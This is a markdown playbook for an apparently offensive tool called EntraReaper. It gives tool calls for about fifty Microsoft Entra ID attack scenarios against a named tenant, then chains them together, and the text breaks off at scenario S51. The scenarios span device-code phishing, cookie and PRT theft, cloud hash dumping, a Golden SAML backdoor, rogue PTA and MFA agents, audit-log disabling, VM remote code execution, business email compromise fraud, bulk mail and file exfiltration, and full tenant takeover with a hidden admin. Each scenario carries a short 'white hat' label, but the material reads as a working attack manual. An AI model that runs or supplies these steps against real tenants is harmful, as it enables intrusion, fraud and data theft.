# EntraReaper — 65 Attack Scenarios

65 scenarios across all tool categories. Each has a hat color (engagement type),
perspective (internal/external), MITRE mapping, OPSEC level, and step-by-step tool calls.
Target: m.grdz.org (adaptable to any Entra ID tenant).

## Hat Legend

| Hat | Engagement Type | Example |
|-----|----------------|---------|
| WHITE | Authorized pentest, red team, compliance audit | Customer-approved assessment |
| GRAY | Authorized but pushing boundaries, research, bug bounty | MSRC submission, internal red team |
| BLACK | Adversary simulation, threat modeling (how an attacker would do it) | Incident response tabletop |

## Perspective Legend

| Perspective | Description |
|-------------|-------------|
| EXTERNAL | No credentials, no network access, internet-only |
| EXTERNAL+CRED | External with stolen/phished credentials |
| INTERNAL | Inside the org network or with valid employee account |
| PARTNER | MSP, vendor, or B2B partner access |
| PRIVILEGED | Admin-level access (Global Admin, AAD Connect, etc.) |

---

## RECON -- UNAUTHENTICATED (S01-S08)

### S01: Tenant Fingerprint
**Hat:** WHITE | **Perspective:** EXTERNAL | **OPSEC:** Silent
**MITRE:** T1589.001 | **Tools:** `recon_tenant`

```
recon_tenant(domain="m.grdz.org")
```

**White hat use:** Pre-engagement scoping. Confirm tenant exists, identify auth type for test plan.
**Black hat use:** First step in targeted attack. Determines entire kill chain.
**Output:** Tenant ID, federation type, brand, auth endpoints.

---

### S02: Domain Inventory
**Hat:** WHITE | **Perspective:** EXTERNAL | **OPSEC:** Silent
**MITRE:** T1590.001 | **Tools:** `recon_domains`

```
recon_domains(domain="m.grdz.org")
```

**White hat use:** Attack surface mapping. Identify shadow IT, forgotten dev domains.
**Gray hat use:** Bug bounty scope validation. Find in-scope subdomains.
**Output:** All registered domains in the tenant.

---

### S03: User Enumeration -- Targeted C-Suite
**Hat:** GRAY | **Perspective:** EXTERNAL | **OPSEC:** Low
**MITRE:** T1589.002 | **Tools:** `recon_users`

```
recon_users(domain="m.grdz.org",
            usernames=["admin","ceo","cfo","cto","ciso","hr","it","helpdesk","security","soc"],
            method="normal")
```

**White hat use:** Validate target list for authorized phishing simulation.
**Black hat use:** Build spearphishing target list. Zero lockout, zero logs.
**Output:** List of confirmed valid accounts.

---

### S04: User Enumeration -- LinkedIn OSINT Pipeline
**Hat:** GRAY | **Perspective:** EXTERNAL | **OPSEC:** Silent (LinkedIn) + Low (validation)
**MITRE:** T1589.002, T1593.001 | **Tools:** LinkedIn (manual/API), `recon_users`

```
# Phase 1: Harvest names from LinkedIn (OSINT, no target contact)
# Search: "Company Name" on LinkedIn → People tab
# Collect: First Last, Job Title, Department
# Tools: linkedin2username, CrossLinked, linkedin-scraper, or manual collection
#
# Common UPN patterns to try per name:
#   first.last@domain     (most common: john.smith@m.grdz.org)
#   flast@domain          (jsmith@m.grdz.org)
#   firstl@domain         (johns@m.grdz.org)
#   first@domain          (john@m.grdz.org)
#   first_last@domain     (john_smith@m.grdz.org)
#   last.first@domain     (smith.john@m.grdz.org)

# Phase 2: Generate UPN permutations from harvested names
# Example: "John Smith" → ["john.smith", "jsmith", "johns", "john", "john_smith", "smith.john"]

# Phase 3: Validate against Entra ID (zero logs, zero lockout)
recon_users(domain="m.grdz.org",
            usernames=["john.smith","jsmith","johns",
                       "jane.doe","jdoe","janed",
                       "bob.wilson","bwilson","bobw",
                       <... all permutations from LinkedIn harvest>],
            method="normal")

# Phase 4: Cross-reference confirmed UPNs with LinkedIn roles
# Priority targets: C-suite, IT admins, helpdesk, finance, HR
# Device code phishing pretext tailored to their role
```

**White hat use:** Comprehensive user enumeration for red team engagement. Demonstrates OSINT → validated target list pipeline.
**Black hat use:** Mass enumeration for credential stuffing. LinkedIn provides names + roles for spearphishing pretext.
**Gray hat use:** Bug bounty -- demonstrate user enumeration exposure to MSRC.
**Key insight:** LinkedIn gives you names + job titles (social engineering pretext). GetCredentialType gives you confirmation (zero logs). Combined = validated, role-enriched target list without ever touching the target's infrastructure.

**LinkedIn OSINT Tools:**
- `linkedin2username` (github.com/initstring/linkedin2username) -- generates UPN permutations from company employees
- `CrossLinked` (github.com/m8sec/CrossLinked) -- LinkedIn enumeration via search engine scraping (no API key)
- Manual: LinkedIn People search → export to CSV → generate permutations
- GitHub/GitLab: search for `@domain` in commits, issues, READMEs
- Breach databases: HaveIBeenPwned, DeHashed for known email formats

---

### S05: Federation Endpoint Discovery
**Hat:** WHITE | **Perspective:** EXTERNAL | **OPSEC:** Silent
**MITRE:** T1590.001 | **Tools:** `recon_dns`

```
recon_dns(domain="m.grdz.org")
```

**White hat use:** Identify exposed ADFS/Okta/Ping endpoints for pentest scoping.
**Black hat use:** Federation URLs bypass cloud Smart Lockout. WSTrust active endpoints accept direct password spray.
**Output:** Federation URLs, MX, autodiscover, tenant metadata.

---

### S06: OpenID Configuration Harvest
**Hat:** WHITE | **Perspective:** EXTERNAL | **OPSEC:** Silent
**MITRE:** T1590.001 | **Tools:** `recon_openid`

```
recon_openid(domain="m.grdz.org")
```

**White hat use:** Validate OIDC configuration for security review.
**Gray hat use:** Check if implicit grant flow is enabled (token theft risk). Map signing algorithms (RS256 only or others?).

---

### S07: Multi-Tenant Supply Chain Recon
**Hat:** GRAY | **Perspective:** EXTERNAL | **OPSEC:** Silent
**MITRE:** T1591.004 | **Tools:** `recon_tenant` (multiple)

```
recon_tenant(domain="vendor1.com")
recon_tenant(domain="vendor2.com")
recon_tenant(domain="subsidiary.org")
# Compare federation, SSO, domain counts -- weakest link wins
```

**White hat use:** Third-party risk assessment. Identify weakest vendor in supply chain.
**Black hat use:** SolarWinds/Kaseya playbook. Compromise weakest link, pivot to all.

---

### S08: ActiveSync Protocol Probing
**Hat:** WHITE | **Perspective:** EXTERNAL | **OPSEC:** Silent
**MITRE:** T1590.004 | **Tools:** `raw_invoke`

```
raw_invoke(cmdlet="Get-AADIntEASAutoDiscover",
           parameters={"Email": "user@m.grdz.org", "Protocol": "ActiveSync"})
raw_invoke(cmdlet="Get-AADIntEASAutoDiscover",
           parameters={"Email": "user@m.grdz.org", "Protocol": "Ews"})
raw_invoke(cmdlet="Get-AADIntEASAutoDiscover",
           parameters={"Email": "user@m.grdz.org", "Protocol": "Rest"})
```

**White hat use:** Validate legacy protocol exposure. EAS/EWS often bypass CA policies.
**Gray hat use:** Find protocol-level auth bypass for bug bounty.

---

## RECON -- AUTHENTICATED (S09-S16)

### S09: Full Insider Tenant Dump
**Hat:** WHITE | **Perspective:** INTERNAL | **OPSEC:** Medium
**MITRE:** T1087.004 | **Tools:** `cred_token`, `recon_insider`

```
cred_token(resource="aad_graph", method="interactive", save_as="insider")
recon_insider(token_alias="insider", scope="full")
```

**White hat use:** Red team -- map all users, groups, apps, roles, service principals.
**Internal blue team use:** Audit directory for stale accounts, over-permissioned apps.
**Output:** Complete tenant object inventory.

---

### S10: Conditional Access Gap Analysis
**Hat:** WHITE | **Perspective:** INTERNAL | **OPSEC:** Medium
**MITRE:** T1518.001 | **Tools:** `recon_ca_policies`

```
recon_ca_policies(token_alias="admin")
```

**White hat use:** Security audit -- find CA policy gaps, excluded users, legacy auth holes.
**Gray hat use:** Red team -- identify bypass paths for MFA, device compliance, location policies.
**Black hat use:** Target: users in excluded groups, apps without MFA, legacy protocol allowances.

---

### S11: Hybrid Infrastructure Assessment
**Hat:** WHITE | **Perspective:** INTERNAL | **OPSEC:** Medium
**MITRE:** T1518.001 | **Tools:** `recon_sync_config`

```
recon_sync_config(token_alias="graph")
```

**White hat use:** Audit AAD Connect configuration. Is PHS, PTA, or SSO enabled? Each has different risk profiles.
**Internal use:** Verify sync security posture. Check for unnecessary features enabled.
**Decision tree:** PTA on = S31 viable. SSO on = S42 viable. PHS on = S23 viable.

---

### S12: Guest Access Boundary Testing
**Hat:** GRAY | **Perspective:** EXTERNAL+CRED | **OPSEC:** Low
**MITRE:** T1087.004 | **Tools:** `cred_token`, `recon_guest`

```
cred_token(resource="aad_graph", method="interactive", save_as="guest")
recon_guest(token_alias="guest")
```

**White hat use:** Test what guests can see. Many tenants expose more than intended.
**Gray hat use:** B2B partner privilege testing. Can a guest enumerate admin accounts?
**Bug bounty use:** Demonstrate information disclosure via guest access misconfiguration.

---

### S13: Dynamic Group Privilege Escalation Discovery
**Hat:** GRAY | **Perspective:** INTERNAL | **OPSEC:** Medium
**MITRE:** T1069.003 | **Tools:** `raw_invoke`

```
raw_invoke(cmdlet="Get-AADIntDynamicAbusableGroups", token_alias="graph")
```

**White hat use:** Find self-service escalation paths via dynamic group rules.
**Gray hat use:** Can a regular user change their department attribute to match admin group rules?
**Example:** Dynamic rule `user.department -eq "IT Security"` = change your department, get admin group.

---

### S14: Service Principal and App Registration Audit
**Hat:** WHITE | **Perspective:** INTERNAL | **OPSEC:** Medium
**MITRE:** T1087.004 | **Tools:** `raw_invoke`

```
raw_invoke(cmdlet="Get-AADIntServicePrincipals", token_alias="graph")
```

**White hat use:** Find over-permissioned apps, apps with expiring secrets, abandoned apps.
**Internal security use:** Identify apps with Directory.Read.All (DCaaS risk), Mail.ReadWrite (mail access), etc.
**Output:** All enterprise apps with permission grants.

---

### S15: MFA Method Weakness Assessment
**Hat:** WHITE | **Perspective:** PRIVILEGED | **OPSEC:** Medium
**MITRE:** T1087.004 | **Tools:** `cred_mfa_read`

```
cred_mfa_read(token_alias="admin", user="admin@m.grdz.org")
cred_mfa_read(token_alias="admin", user="test@m.grdz.org")
```

**White hat use:** Audit MFA method strength. Flag SMS-only (SIM swap), single-method (fatigue), no backup.
**Internal security use:** Compliance check -- are admins using FIDO2? Is phone MFA disabled for high-risk accounts?

---

### S16: Access Package Self-Service Escalation
**Hat:** GRAY | **Perspective:** INTERNAL | **OPSEC:** Medium
**MITRE:** T1087.004 | **Tools:** `raw_invoke`

```
raw_invoke(cmdlet="Get-AADIntAccessPackages", token_alias="graph")
raw_invoke(cmdlet="Get-AADIntAccessPackageCatalogs", token_alias="graph")
```

**White hat use:** Audit access governance. Can users request admin access through self-service?
**Gray hat use:** Test if access package approval workflows can be bypassed or social-engineered.

---

## CREDENTIAL ACCESS (S17-S24)

### S17: Device Code Phishing -- Office Impersonation
**Hat:** GRAY | **Perspective:** EXTERNAL | **OPSEC:** Low
**MITRE:** T1566.002, T1528 | **Tools:** `cred_device_code`

```
cred_device_code(resource="graph",
                 client_id="d3590ed6-52b3-4102-aeff-aad2292ab01c",
                 tenant="m.grdz.org",
                 save_as="phished_graph")
```

**White hat use:** Authorized phishing simulation. Test employee awareness against device code attacks.
**Black hat use:** First-party client ID makes the sign-in prompt look completely legitimate.
**Key insight:** Victim sees official Microsoft login page. No fake domains. No phishing kits.

---

### S18: Device Code Phishing -- Teams Impersonation
**Hat:** GRAY | **Perspective:** EXTERNAL | **OPSEC:** Low
**MITRE:** T1566.002 | **Tools:** `cred_device_code`

```
cred_device_code(resource="teams",
                 client_id="1fec8e78-bce4-4aaf-ab1b-5451cc387264",
                 save_as="phished_teams")
```

**White hat use:** Test if Teams-specific CA policies block device code flow.
**Social engineering pretext:** "Teams requires re-authentication due to security update."

---

### S19: FOCI Token Cross-Resource Pivot
**Hat:** GRAY | **Perspective:** EXTERNAL+CRED | **OPSEC:** Medium
**MITRE:** T1528 | **Tools:** `cred_token` (multiple resources)

```
# One token becomes access to everything
cred_token(resource="graph", method="interactive", save_as="graph")
cred_token(resource="exo", save_as="exo")
cred_token(resource="teams", save_as="teams")
cred_token(resource="spo", save_as="spo")
cred_token(resource="onedrive", save_as="onedrive")
cred_token(resource="azure", save_as="azure")
cred_token(resource="compliance", save_as="compliance")
```

**White hat use:** Demonstrate FOCI risk. One phish = 37 app access.
**Internal red team:** Validate that CA policies cover all resource types, not just Graph/EXO.

---

### S20: JWT Token Forensic Analysis
**Hat:** WHITE | **Perspective:** INTERNAL | **OPSEC:** None (local)
**MITRE:** T1528 | **Tools:** `cred_token_decode`

```
cred_token_decode(token_alias="graph")
cred_token_decode(raw_token="eyJ0eXAiOi...")
```

**White hat use:** Incident response -- analyze captured attacker tokens. Identify scopes, roles, tenant.
**Blue team use:** Validate token permissions during security review.
**Output:** Decoded JWT: aud, iss, upn, roles, scp, tid, exp, nbf, iat.

---

### S21: Browser Session Cookie Extraction
**Hat:** GRAY | **Perspective:** INTERNAL | **OPSEC:** Medium
**MITRE:** T1539 | **Tools:** `cred_cookie`

```
cred_cookie(action="get")
cred_cookie(action="decode", cookie_value="<ESTSAUTHPERSISTENT>")
```

**White hat use:** Test session management. Do cookies persist after password change?
**Black hat use:** ESTSAUTH cookies bypass MFA. Persistent cookies survive browser restarts.
**Gray hat use:** Demonstrate pass-the-cookie attack in red team report.

---

### S22: PRT Extraction for Device Impersonation
**Hat:** GRAY | **Perspective:** INTERNAL | **OPSEC:** Medium
**MITRE:** T1552.004, T1550.001 | **Tools:** `cred_prt_extract`

```
cred_prt_extract(token_alias="join_token", prt_method="keys")
cred_prt_extract(token_alias="join_token", prt_method="token")
```

**White hat use:** Test if device-based CA policies can be bypassed via PRT theft.
**Internal red team:** Demonstrate that joined devices are sensitive assets.
**Key insight:** PRT satisfies MFA, device compliance, and Hybrid AD join simultaneously.

---

### S23: Cloud DCSync (NT Hash Extraction)
**Hat:** BLACK | **Perspective:** PRIVILEGED | **OPSEC:** HIGH
**MITRE:** T1003.006 | **Tools:** `cred_token`, `cred_nthash`

```
cred_token(resource="graph", method="certificate",
           tenant="m.grdz.org", save_as="dcsync_app")
cred_nthash(token_alias="dcsync_app")
```

**White hat use:** Authorized red team -- demonstrate cloud DCSync risk to executives.
**Black hat use:** Extract all cloud user NTLM hashes. Offline cracking. Pass-the-hash.
**Prerequisite:** App registration with Directory.Read.All + certificate.

---

### S24: Stolen Credential Validation
**Hat:** GRAY | **Perspective:** EXTERNAL+CRED | **OPSEC:** Medium
**MITRE:** T1078.004 | **Tools:** `cred_token`

```
cred_token(resource="graph",
           method="credentials",
           username="admin@m.grdz.org",
           password="<from_breach_db>",
           save_as="validated")
```

**White hat use:** Credential breach validation. Check if leaked passwords are still active.
**Internal security:** Periodic credential exposure testing against breach databases.

---

## INITIAL ACCESS (S25-S26)

### S25: Automated Phishing Campaign
**Hat:** GRAY | **Perspective:** EXTERNAL | **OPSEC:** Medium
**MITRE:** T1566.002 | **Tools:** `access_phishing`

```
access_phishing(
    targets=["admin@m.grdz.org", "test@m.grdz.org"],
    subject="IT Security: Mandatory Account Verification Required",
    save_as="campaign1")
```

**White hat use:** Authorized phishing engagement. Measure click/auth rates.
**Black hat use:** Automated phish+capture. Token returned when victim authenticates.
**Key insight:** Victim authenticates on real Microsoft page. No fake infrastructure needed.

---

### S26: Guest Account Infiltration
**Hat:** GRAY | **Perspective:** EXTERNAL+CRED | **OPSEC:** Medium
**MITRE:** T1078.004 | **Tools:** `access_guest_invite`

```
access_guest_invite(token_alias="graph",
                    email="research@attacker.com",
                    redirect_url="https://myapps.microsoft.com",
                    message="Join our security research collaboration")
```

**White hat use:** Test guest invite policies. Are restrictions in place?
**Black hat use:** Plant an attacker account inside the tenant. Persistent access via B2B trust.
**Internal audit:** Verify who can invite guests and what guests can access.

---

## PERSISTENCE (S27-S33)

### S27: Golden SAML Backdoor Installation
**Hat:** BLACK | **Perspective:** PRIVILEGED | **OPSEC:** LOUD
**MITRE:** T1484.002 | **Tools:** `opsec_check`, `persist_federation`

```
opsec_check(tool_name="persist_federation")
persist_federation(token_alias="admin", domain="m.grdz.org", action="install")
```

**White hat use:** Demonstrate Golden SAML to board/CISO. Show survivability across password resets.
**Black hat use:** Ultimate persistence. Survives everything except federation cert revocation.
**Detection:** Federation setting changes in Entra audit logs. HIGH-FIDELITY alert.

---

### S28: SAML Token Forging
**Hat:** BLACK | **Perspective:** PRIVILEGED | **OPSEC:** Low (post-install)
**MITRE:** T1606.002 | **Tools:** `persist_federation`, `persist_saml_forge`

```
persist_federation(token_alias="admin", domain="m.grdz.org", action="list_users")
persist_saml_forge(immutable_id="<ImmutableID>",
                   issuer_uri="<backdoor_issuer>",
                   cert_path="./backdoor.pfx")
```

**White hat use:** Prove Golden SAML impact -- impersonate CEO without their password.
**Key insight:** Once backdoor cert is installed, forging happens offline. No API calls needed.

---

### S29: Rogue Device -- Azure AD Join
**Hat:** GRAY | **Perspective:** EXTERNAL+CRED | **OPSEC:** Medium
**MITRE:** T1098.005 | **Tools:** `cred_token`, `persist_device`

```
cred_token(resource="aad_join", save_as="join")
persist_device(token_alias="join",
               device_name="YOURCOMPANY-WS-0847",
               os_version="10.0.22631.4602",
               join_type="aad")
```

**White hat use:** Test device registration policies. Can any user register unlimited devices?
**Gray hat use:** Bypass device-based CA by registering a compliant device.
**Key insight:** Use realistic naming (YOURCOMPANY-WS-XXXX) to blend in with real inventory.

---

### S30: Rogue Device -- Intune Enrollment
**Hat:** GRAY | **Perspective:** EXTERNAL+CRED | **OPSEC:** Medium
**MITRE:** T1098.005 | **Tools:** `persist_device`

```
cred_token(resource="intune", save_as="intune")
persist_device(token_alias="intune",
               device_name="YOURCOMPANY-MB-0293",
               join_type="intune")
```

**White hat use:** Test Intune enrollment restrictions. Validate device limit policies.
**Black hat use:** Receive MDM policies containing WiFi certs, VPN configs, internal URLs.
**Internal red team:** Demonstrate MDM config leakage to unmanaged devices.

---

### S31: Rogue PTA Agent -- Total Auth Bypass
**Hat:** BLACK | **Perspective:** PRIVILEGED | **OPSEC:** LOUD
**MITRE:** T1556.007 | **Tools:** `opsec_check`, `cred_token`, `persist_pta_agent`

```
opsec_check(tool_name="persist_pta_agent")
cred_token(resource="pta", save_as="pta")
persist_pta_agent(token_alias="pta")
```

**White hat use:** Demonstrate PTA risk to security leadership. Argue for PHS migration.
**Black hat use:** Every password validation flows through attacker. Accept any password for any user.
**Detection:** New PTA agent registration. One of the highest-fidelity alerts in Entra ID.

---

### S32: Rogue MFA Authenticator
**Hat:** GRAY | **Perspective:** INTERNAL | **OPSEC:** Medium
**MITRE:** T1098.005, T1111 | **Tools:** `persist_mfa_app`, `raw_invoke`

```
persist_mfa_app(token_alias="graph", user="admin@m.grdz.org")
# Generate TOTP codes on demand:
raw_invoke(cmdlet="New-AADIntOTP", parameters={"SecretKey": "<secret>"})
```

**White hat use:** Test MFA app registration policies. Can users add unlimited auth apps?
**Black hat use:** Persistent MFA bypass. Codes generated without victim's phone.
**Key insight:** Survives password resets. Only removed via manual MFA method deletion.

---

### S33: Rogue Sync Agent
**Hat:** BLACK | **Perspective:** PRIVILEGED | **OPSEC:** HIGH
**MITRE:** T1556.007 | **Tools:** `raw_invoke`

```
raw_invoke(cmdlet="Register-AADIntSyncAgent", token_alias="sync")
```

**White hat use:** Audit sync agent inventory. Are there unauthorized agents?
**Black hat use:** Persistent directory write access. Modify user attributes, group memberships, bypass RBAC.

---

## PRIVILEGE ESCALATION (S34-S37)

### S34: Azure Subscription Takeover
**Hat:** BLACK | **Perspective:** PRIVILEGED | **OPSEC:** HIGH
**MITRE:** T1548 | **Tools:** `privesc_azure_admin`

```
privesc_azure_admin(token_alias="admin")
azure_enum(token_alias="azure", scope="all")
```

**White hat use:** Demonstrate Azure escalation path from Entra GA to Azure Owner.
**Black hat use:** One API call = Owner on every subscription. Access VMs, secrets, databases.
**Internal red team:** Prove that GA protection extends to Azure resource security.

---

### S35: Sync API Password Reset (No MFA, No Old Password)
**Hat:** BLACK | **Perspective:** PRIVILEGED | **OPSEC:** HIGH
**MITRE:** T1098.001 | **Tools:** `privesc_password_reset`

```
privesc_password_reset(token_alias="sync_account",
                       target_user="globaladmin@m.grdz.org",
                       new_password="N3wP@ss!2026")
```

**White hat use:** Demonstrate Sync API risk. Argue for sync account monitoring.
**Black hat use:** Reset any password. No old password. No MFA. Sync API bypasses normal RBAC.
**Key insight:** The AAD Connect service account is often the most dangerous credential in the tenant.

---

### S36: Azure RBAC Role Injection
**Hat:** GRAY | **Perspective:** PRIVILEGED | **OPSEC:** HIGH
**MITRE:** T1098.003 | **Tools:** `privesc_role_assign`

```
privesc_role_assign(token_alias="azure",
                    target_user="<attacker_objectid>",
                    role="Owner",
                    scope="/subscriptions/<id>")
```

**White hat use:** Test RBAC alerting. Does your SOC detect new Owner assignments?
**Internal red team:** Validate that Azure role assignments are monitored and alerted.

---

### S37: Group Membership Injection via Sync API
**Hat:** BLACK | **Perspective:** PRIVILEGED | **OPSEC:** HIGH
**MITRE:** T1098.003 | **Tools:** `raw_invoke`

```
raw_invoke(cmdlet="Set-AADIntAzureADGroupMember",
           token_alias="sync",
           parameters={"GroupId": "<admin_group_objectid>",
                        "ObjectId": "<attacker_objectid>"})
```

**White hat use:** Demonstrate that Sync API bypasses PIM, access reviews, and approval workflows.
**Black hat use:** Direct injection into Global Admins group. No approval chain. No PIM activation.

---

## DEFENSE EVASION (S38-S41)

### S38: Audit Log Suppression
**Hat:** BLACK | **Perspective:** PRIVILEGED | **OPSEC:** LOUD
**MITRE:** T1562.008 | **Tools:** `evade_audit_logs`

```
evade_audit_logs(token_alias="admin", action="status")
evade_audit_logs(token_alias="admin", action="disable")
# ... 24hr window of no logging ...
evade_audit_logs(token_alias="admin", action="enable")
```

**White hat use:** Test UAL monitoring. Does your SOC alert on UAL disable?
**Black hat use:** Create a logging gap. The disable event itself IS logged (race condition).
**Key insight:** ~24 hours before logs fully stop propagating. Smart SOCs detect the disable immediately.

---

### S39: Tenant Permissiveness Escalation
**Hat:** GRAY | **Perspective:** PRIVILEGED | **OPSEC:** HIGH
**MITRE:** T1562.001 | **Tools:** `evade_policy_weaken`

```
evade_policy_weaken(token_alias="admin", target="guest_access", action="status")
evade_policy_weaken(token_alias="admin", target="guest_access", action="weaken")
```

**White hat use:** Audit guest access policies. Test if changes are detected and alerted.
**Internal security:** Verify guest access settings match organizational policy.
**Black hat use:** Open the door for external account infiltration and B2B trust abuse.

---

### S40: Disable PTA (Force Cloud Auth)
**Hat:** BLACK | **Perspective:** PRIVILEGED | **OPSEC:** HIGH
**MITRE:** T1556.007 | **Tools:** `evade_policy_weaken`

```
evade_policy_weaken(token_alias="sync", target="pta", action="weaken")
```

**White hat use:** Test auth method change alerting. Does the SOC detect PTA going offline?
**Black hat use:** After installing rogue PTA (S31), disable legitimate PTA. All auth flows through attacker.
**Alternative black hat use:** Force fallback to PHS. If PHS hashes are weaker, offline cracking becomes viable.

---

### S41: Disable Seamless SSO
**Hat:** GRAY | **Perspective:** PRIVILEGED | **OPSEC:** HIGH
**MITRE:** T1556 | **Tools:** `evade_policy_weaken`

```
evade_policy_weaken(token_alias="sync", target="sso", action="weaken")
```

**White hat use:** Test SSO change alerting. Impact analysis of SSO disruption.
**Black hat use:** Force password re-authentication. Combined with rogue PTA (S31), captures every user's password.
**Covering tracks:** Remove Silver Ticket attack surface after using it (S42 follow-up).

---

## LATERAL MOVEMENT (S42-S45)

### S42: Azure VM Remote Code Execution
**Hat:** GRAY | **Perspective:** PRIVILEGED | **OPSEC:** HIGH
**MITRE:** T1021.007 | **Tools:** `azure_enum`, `move_vm_exec`

```
azure_enum(token_alias="azure", scope="vms")
move_vm_exec(token_alias="azure",
             vm_name="PROD-DC-01",
             resource_group="infrastructure",
             subscription="<id>",
             script_content="whoami; net user; ipconfig /all")
```

**White hat use:** Red team cloud-to-on-prem pivot demonstration.
**Black hat use:** RCE on domain controllers, database servers, application servers.
**Internal red team:** Validate that RunCommand execution is monitored in Azure Activity logs.

---

### S43: Teams Internal Spearphishing
**Hat:** GRAY | **Perspective:** INTERNAL | **OPSEC:** Medium
**MITRE:** T1534 | **Tools:** `cred_token`, `move_messaging`

```
cred_token(resource="teams", save_as="teams")
move_messaging(token_alias="teams",
               target="cfo@m.grdz.org",
               message="Urgent: review this document before 5pm",
               platform="teams")
```

**White hat use:** Authorized phishing simulation via internal channels.
**Black hat use:** Internal Teams messages bypass email filters. Trusted sender. High success rate.
**Chain with:** Device code link in the message for token capture.

---

### S44: Business Email Compromise
**Hat:** BLACK | **Perspective:** INTERNAL | **OPSEC:** Medium
**MITRE:** T1534 | **Tools:** `move_messaging`

```
move_messaging(token_alias="exo",
               target="vendor@external.com",
               message="Updated bank details for future invoices...",
               subject="RE: Invoice #8847 - Updated Payment Info",
               platform="outlook")
```

**White hat use:** BEC simulation to test vendor payment verification procedures.
**Black hat use:** Redirect wire transfers. Send from legitimate mailbox in existing thread.
**Financial impact:** Average BEC loss is $125,000 per incident (FBI IC3 2024).

---

### S45: MSP Partner Tenant Pivot
**Hat:** BLACK | **Perspective:** PARTNER | **OPSEC:** Medium
**MITRE:** T1199 | **Tools:** `cred_token`, `move_partner_pivot`, `recon_insider`

```
cred_token(resource="partner", save_as="partner")
move_partner_pivot(token_alias="partner", action="list")
move_partner_pivot(token_alias="partner", action="request",
                   target_tenant="<customer_id>")
cred_token(resource="graph", tenant="<customer_id>", save_as="customer")
recon_insider(token_alias="customer", scope="full")
```

**White hat use:** MSP security audit. Validate GDAP least-privilege and monitoring.
**Black hat use:** Compromise one MSP = 50-500 customer tenants. SolarWinds playbook.
**Internal MSP security:** Review partner role assignments and admin access across customers.

---

## COLLECTION and EXFILTRATION (S46-S49)

### S46: OneDrive Data Exfiltration
**Hat:** GRAY | **Perspective:** INTERNAL | **OPSEC:** Medium
**MITRE:** T1530 | **Tools:** `cred_token`, `collect_onedrive`

```
cred_token(resource="onedrive", save_as="onedrive")
collect_onedrive(token_alias="onedrive", action="list")
collect_onedrive(token_alias="onedrive", action="download")
```

**White hat use:** Test DLP detection for bulk file downloads.
**Black hat use:** Personal docs, credentials files, SSH keys, business plans.
**Internal audit:** Identify sensitive files stored in user OneDrives without protection.

---

### S47: SharePoint Intelligence Gathering
**Hat:** GRAY | **Perspective:** INTERNAL | **OPSEC:** Medium
**MITRE:** T1530 | **Tools:** `collect_sharepoint`

```
collect_sharepoint(token_alias="spo",
                   site_url="https://mgrdz.sharepoint.com/sites/hr",
                   action="users")
collect_sharepoint(token_alias="spo",
                   site_url="https://mgrdz.sharepoint.com/sites/hr",
                   action="download",
                   file_path="/Shared Documents/Employee_Data.xlsx")
```

**White hat use:** Test SharePoint permission model. Can regular users access HR/Finance sites?
**Internal security:** Audit site sharing settings and guest access.

---

### S48: Teams Message Intelligence Harvest
**Hat:** GRAY | **Perspective:** INTERNAL | **OPSEC:** Medium
**MITRE:** T1530 | **Tools:** `collect_teams`

```
collect_teams(token_alias="teams", action="teams")
collect_teams(token_alias="teams", action="messages")
```

**White hat use:** Test if sensitive conversations are being had in unprotected channels.
**Black hat use:** Credentials shared in chat, decision-making context, meeting recordings.
**Internal audit:** Check for secrets, passwords, API keys shared in Teams messages.

---

### S49: Full Mailbox Collection
**Hat:** GRAY | **Perspective:** INTERNAL | **OPSEC:** Medium
**MITRE:** T1114.002 | **Tools:** `collect_email`

```
collect_email(token_alias="exo")
```

**White hat use:** Test MailItemsAccessed logging (E5). Validate DLP policies on email content.
**Black hat use:** Email is the crown jewel. Password resets, MFA codes, financial approvals, trade secrets.
**Key insight:** MailItemsAccessed audit requires E5 license. E3 tenants have blind spot.

---

## IMPACT (S50)

### S50: Full Tenant Takeover -- Combined Impact
**Hat:** BLACK | **Perspective:** PRIVILEGED | **OPSEC:** LOUD
**MITRE:** T1136.003, T1531, T1484 | **Tools:** `impact_user_ops`, `impact_config`, `privesc_role_assign`

```
# 1. Create hidden admin account
impact_user_ops(token_alias="admin", action="create",
                properties={"UserPrincipalName": "svc-backup@m.grdz.org",
                             "DisplayName": "Backup Service Account",
                             "Password": "C0mpl3x!2026"})

# 2. Grant Global Admin
privesc_role_assign(token_alias="admin",
                    target_user="<new_objectid>",
                    role="Global Administrator")

# 3. Disable MFA on real admin
impact_user_ops(token_alias="admin", action="disable_mfa",
                target_user="admin@m.grdz.org")

# 4. Spoof device compliance
impact_config(token_alias="admin", action="spoof_compliance",
              params_dict={"DeviceId": "<device_id>"})

# 5. Install federation backdoor
persist_federation(token_alias="admin", domain="m.grdz.org", action="install")
```

**White hat use:** Full red team finale. Demonstrate total tenant compromise to CISO.
**Black hat use:** Complete control. Persistent access via hidden admin + federation backdoor. MFA disabled. Compliance spoofed.
**Tabletop use:** Walk leadership through worst-case scenario and response plan.

---

## KILL CHAINS (Multi-Scenario Sequences)

### Chain A: External to Global Admin
```
S01 -> S03 -> S17 -> S20 -> S09 -> S10 -> S15 -> S34
```
Recon -> User Enum -> Device Code Phish -> Token Decode -> Insider Recon -> CA Audit -> MFA Audit -> Azure Escalate

### Chain B: Golden SAML Persistence
```
S01 -> S17 -> S09 -> S27 -> S28 -> S49 -> S38
```
Recon -> Phish -> Map Tenant -> Install Backdoor -> Forge Tokens -> Exfil Mail -> Disable Logs

### Chain C: BEC Financial Fraud
```
S03 -> S17 -> S19 -> S49 -> S44 -> S46
```
User Enum -> Phish -> FOCI Pivot -> Read Mail -> Send BEC -> Exfil OneDrive

### Chain D: MSP Supply Chain
```
S07 -> S03 -> S17 -> S45 -> S09 -> S50
```
Supply Chain Recon -> User Enum -> Phish MSP -> Pivot to Customers -> Map Tenant -> Full Takeover

### Chain E: Hybrid Infrastructure Takeover
```
S01 -> S17 -> S11 -> S31 -> S24 -> S34 -> S42
```
Recon -> Phish -> Map Hybrid -> Rogue PTA -> Auth as Anyone -> Azure Escalate -> VM RCE

### Chain F: Silent Data Exfiltration
```
S03 -> S18 -> S19 -> S48 -> S46 -> S47 -> S49
```
User Enum -> Phish (Teams) -> FOCI Pivot -> Teams Harvest -> OneDrive -> SharePoint -> Email

### Chain G: Device Trust Abuse
```
S01 -> S17 -> S10 -> S29 -> S22 -> S19
```
Recon -> Phish -> CA Audit -> Rogue Device -> PRT Extract -> FOCI Access Everything

### Chain H: MFA Bypass Persistence
```
S03 -> S17 -> S15 -> S32 -> S24
```
User Enum -> Phish -> MFA Audit -> Rogue Auth App -> Login Anytime with TOTP

---

## ADVANCED SCENARIOS (S51-S65)

### S51: OAuth Consent Grant Attack (Illicit App Consent)
